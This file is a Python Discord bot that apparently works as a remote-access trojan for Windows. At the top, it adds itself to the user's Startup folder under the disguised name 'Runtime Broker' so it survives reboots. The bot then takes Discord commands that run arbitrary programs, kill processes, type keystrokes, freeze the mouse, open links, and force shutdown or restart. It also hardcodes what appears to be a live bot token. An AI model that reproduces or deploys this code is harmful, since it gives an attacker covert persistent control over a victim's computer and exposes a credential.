import nextcord
from nextcord.ext import commands
from nextcord import *
import webbrowser as w
import subprocess as s
import psutil
import pyautogui
import os
import sys
import winshell
from win32com.client import Dispatch

# Get the path to the running script
target = os.path.abspath(sys.argv[0])

# Define the directory where the shortcut will be placed
shortcut_dir = rf"C:\Users\{os.getlogin()}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"  # Replace with your desired path
print(shortcut_dir)

# Define the name of the shortcut
shortcut_name = "Runtime Broker"

# Create the shortcut path
shortcut_path = os.path.join(shortcut_dir, f"{shortcut_name}.lnk")



# Check if the shortcut already exists
if os.path.exists(shortcut_path):
    print(f"Shortcut already exists at {shortcut_path}")
else:
    # Use Dispatch to create the shortcut
    shell = Dispatch('WScript.Shell')
    shortcut = shell.CreateShortCut(shortcut_path)
    shortcut.Targetpath = target
    shortcut.WorkingDirectory = os.path.dirname(target)
    shortcut.save()

    print(f"Shortcut created at {shortcut_path}")








# Intents and Bot setup
intents = nextcord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents)

# Replace with your bot's token
TOKEN = 'MTI1MTE3NDE1Nzg4Mjg4NDA5Nw.GH33ln.rdbsh_6d8N2MIeZfuVWkPGJekZ0eyIrPUrWjHE'

# Event: Bot is ready
@bot.event
async def on_ready():
    print(f'Logged in as {bot.user} (ID: {bot.user.id})')
    print('------')

# Context command example
@bot.command()
async def ping(ctx):
    await ctx.send("Pong!")

# Open a link
@bot.slash_command(
    name="web",
    description="Open A Link!",
)
async def webb(interaction: nextcord.Interaction, link: str, times: int):
    for i in range(times):
        w.open_new(link)
    await interaction.response.send_message(f"The Link: **'{link}'** has been Opened.")

# Open Tasks using Subprocess
@bot.slash_command(
    name="open",
    description="Open A App!",
)
async def open(interaction: nextcord.Interaction, app: str, times: int):
    for i in range(times):
        s.Popen(app)
    await interaction.response.send_message(f"**'{app}'** has been Opened **{times}** times.")

# Open Tasks using Subprocess
@bot.slash_command(
    name="close",
    description="Close A App!",
)
async def close(interaction: nextcord.Interaction, app: str):
    try:
        for proc in psutil.process_iter(['name']):
            if app.lower() in proc.info['name'].lower():
                proc.terminate()
                await interaction.response.send_message(f"**'{app}'** has been terminated.")
            
    except Exception as e:
        await interaction.response.send_message(f"Failed to close application: **{e}**")

# Open Tasks using Subprocess
@bot.slash_command(
    name="type",
    description="Type on Host PC!",
)
async def type(interaction: nextcord.Interaction, text: str):
    pyautogui.write(text, interval=0)
    await interaction.response.send_message(f" The text: **'{text}'** has been Typed.")

# Open Tasks using Subprocess
@bot.slash_command(
    name="freeze",
    description="Freeze the mouse of Host PC!",
)
async def type(interaction: nextcord.Interaction, times: int):
    await interaction.response.send_message(f"The Mouse has been freezed **{times}** times.")
    screen_width, screen_height = pyautogui.size()
    center_x = screen_width // 2
    center_y = screen_height // 2

    for i in range(times):
        pyautogui.moveTo(center_x, center_y)
    
# Slash command to control PC power (Windows only)
@bot.slash_command(
    name="power",
    description="Control PC power options (Windows only)",
)
async def power_options(
    interaction: nextcord.Interaction,
    option: str = nextcord.SlashOption(
        name="power",
        choices={"sleep", "restart", "shutdown", "lock"},
    )
):
    try:
        if option == "meme":
            False
        elif option == "sleep":
            # Execute sleep command (Windows)
            await interaction.response.send_message("Attempting to put the PC to sleep.")
            os.system("rundll32.exe powrprof.dll,SetSuspendState 0,1,0")
        elif option == "restart":
            # Execute restart command (Windows)
            await interaction.response.send_message("Attempting to restart the PC.")
            os.system("shutdown /r /t 0 /f")
        elif option == "shutdown":
            # Execute shutdown command (Windows)
            await interaction.response.send_message("Attempting to shut down the PC.")
            os.system("shutdown /s /t 0 /f")
        elif option == "lock":
            # Execute lock command (Windows)
            await interaction.response.send_message("Attempting to lock the PC.")
            os.system("rundll32.exe user32.dll,LockWorkStation")
        else:
            await interaction.response.send_message("Invalid option selected.")
    except Exception as e:
        await interaction.response.send_message(f"Failed to execute command: {e}")

# Run the bot
bot.run(TOKEN)
